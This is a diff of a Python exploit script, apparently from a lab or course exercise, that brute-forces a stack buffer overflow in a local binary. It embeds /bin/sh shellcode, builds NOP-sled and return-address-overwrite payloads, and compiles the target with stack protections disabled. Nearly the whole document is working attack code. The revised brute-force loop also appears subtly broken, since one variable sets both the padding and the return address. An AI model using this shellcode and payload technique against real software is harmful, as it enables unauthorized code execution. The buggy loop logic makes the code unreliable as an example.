@@ -8,39 +8,73 @@ shellcode = (
     b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 )
 
-def run_exploit(offset, addr):
-    print(f"[*] Trying offset: {offset}, address: {hex(addr)}")
+stack_start = 0xffffd4cc
+ebp_offset = 44
+eip_offset = 48
+
+def run_exploit(payload):
+    print(f"[*] Trying payload: {payload}")
     
-    # Construct the payload
-    payload = offset * b"\x90" + struct.pack("<I", addr)
-    
-    # Write the payload to a file
-    with open("payload", "wb") as f:
-        f.write(payload)
-    
-    # Run the target program with the payload
-    p = subprocess.Popen(["/srv/target1", payload], env={"SHELLCODE": shellcode}, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    output, error = p.communicate()
-    
-    # Check if the exploit was successful
-    if b"targetuser" in output:
-        print(f"[+] Exploit succeeded with offset: {offset}, address: {hex(addr)}")
-        print(output.decode())
-        return True
+    try:
+        # Write the payload to a file
+        with open("../targets/payload", "wb") as f:
+            f.write(payload)
+        
+        # Run the target program with the payload
+        p = subprocess.Popen(["../targets/target1", "payload"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = p.communicate()
+        
+        # Check if the exploit was successful
+        if b"targetuser" in output:
+            print(f"[+] Exploit succeeded with payload: {payload}")
+            print(output.decode())
+            return True
+        
+        # Print any error messages
+        if error:
+            print(f"[-] Error: {error.decode().strip()}")
+        
+    except Exception as e:
+        print(f"[-] Exception occurred: {str(e)}")
     
     return False
 
+def build_payload(nop_length, eip_offset):
+    nop_sled = b"\x90" * nop_length
+    eip_address = struct.pack("<I", stack_start + eip_offset)
+    
+    padding_length = ebp_offset - len(nop_sled) - len(shellcode)
+    if padding_length < 0:
+        return None
+    
+    padding = b"A" * padding_length
+    
+    payload = nop_sled + shellcode + padding + b"BBBB" + b"A" * (eip_offset - ebp_offset - 4) + eip_address
+    return payload
+
 def brute_force():
     # Define the range of offsets and addresses to test
-    offset_range = range(0, 100, 4)
-    addr_range = range(0xbffff000, 0xc0000000, 0x1000)
+    offset_range = range(0, 1000, 4)  # Increased the range to 1000
+    addr_range = range(-1000, 1000, 4)  # Expanded the address range
     
     for offset in offset_range:
         for addr in addr_range:
-            if run_exploit(offset, addr):
+            payload = build_payload(offset, addr)
+            if payload is None:
+                continue
+            
+            if run_exploit(payload):
                 return
     
-    print("[-] Exploit failed")
+    print("[-] Exploit failed. No suitable offset and address found.")
 
 if __name__ == "__main__":
+    print("[*] Starting brute-force analysis...")
+    
+    # Compile the target program
+    print("[*] Compiling the target program...")
+    subprocess.run(["gcc", "-g", "-fno-stack-protector", "-z", "execstack", "-m32", "-o", "../targets/target1", "../targets/target1.c"])
+    print("[+] Target program compiled.")
+    
     brute_force()
+    print("[*] Brute-force analysis completed.")
